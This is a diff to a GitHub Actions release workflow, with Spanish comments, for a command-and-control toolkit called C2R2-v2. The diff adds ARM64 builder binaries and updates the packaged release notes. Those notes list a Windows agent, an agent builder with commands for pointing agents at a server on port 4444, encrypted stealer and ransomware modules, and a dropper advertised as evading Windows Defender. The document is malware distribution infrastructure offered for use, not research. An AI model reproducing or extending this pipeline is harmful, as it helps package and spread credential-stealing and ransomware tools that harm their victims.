@@ -14,6 +14,9 @@ env:
   DEFAULT_IP: "0.0.0.0"
   DEFAULT_PORT: "4444"
 
+permissions:
+  contents: write
+
 jobs:
   build-rust-binaries:
     name: 🦀 Build Rust Binaries
@@ -216,11 +219,13 @@ jobs:
           mkdir -p release/C2R2-v2/agent
           cp artifacts/rust-binaries/agent.exe release/C2R2-v2/agent/
           
-          # === Builder ===
+          # === Builder (Linux x86_64, ARM64 y Windows) ===
           mkdir -p release/C2R2-v2/builder
-          cp artifacts/rust-binaries/builder release/C2R2-v2/builder/builder-linux
+          cp artifacts/rust-binaries/builder release/C2R2-v2/builder/builder-linux-x86_64
+          cp artifacts/rust-binaries/builder-arm64 release/C2R2-v2/builder/builder-linux-arm64
           cp artifacts/builder-windows/builder.exe release/C2R2-v2/builder/builder.exe
-          chmod +x release/C2R2-v2/builder/builder-linux
+          chmod +x release/C2R2-v2/builder/builder-linux-x86_64
+          chmod +x release/C2R2-v2/builder/builder-linux-arm64
           
           # === Modules (encrypted DLLs) ===
           mkdir -p release/C2R2-v2/modules
@@ -278,7 +283,8 @@ jobs:
           ├── agent/
           │   └── agent.exe                   # Agente Windows (configurar con builder)
           ├── builder/
-          │   ├── builder-linux               # Builder para Linux
+          │   ├── builder-linux-x86_64        # Builder para Linux x86_64
+          │   ├── builder-linux-arm64         # Builder para Linux ARM64 (Raspberry Pi)
           │   └── builder.exe                 # Builder para Windows
           ├── modules/
           │   ├── stealer.dll.enc             # Módulo stealer encriptado
@@ -288,8 +294,8 @@ jobs:
           ├── team-client/
           │   └── c2r2_team_client.exe        # Cliente GUI para operadores
           └── dropper/
-              ├── builder.py                  # Generador de droppers
-              ├── requirements.txt            # Dependencias Python
+              ├── dropper.exe                 # Dropper Rust (evade AV)
+              ├── scripts/                    # Scripts Python (legacy)
               └── README.md                   # Documentación
           ```
           
@@ -308,8 +314,11 @@ jobs:
           
           ### 2. Generar Agente Personalizado
           ```bash
-          # Linux
-          ./builder/builder-linux build-agent --name mi_agente --server IP_SERVIDOR:4444 --production
+          # Linux x86_64
+          ./builder/builder-linux-x86_64 build-agent --name mi_agente --server IP_SERVIDOR:4444 --production
+          
+          # Linux ARM64 (Raspberry Pi)
+          ./builder/builder-linux-arm64 build-agent --name mi_agente --server IP_SERVIDOR:4444 --production
           
           # Windows
           builder.exe build-agent --name mi_agente --server IP_SERVIDOR:4444 --production
@@ -380,7 +389,7 @@ jobs:
             ### Contenido
             - ✅ Servidor C2 (Linux x86_64 y ARM64)
             - ✅ Agente Windows (.exe)
-            - ✅ Builder (Linux y Windows)
+            - ✅ Builder (Linux x86_64, ARM64 y Windows)
             - ✅ Team Client GUI (Windows .exe)
             - ✅ Módulos encriptados (stealer, ransomware)
             - ✅ **Dropper Rust** (evade Windows Defender)
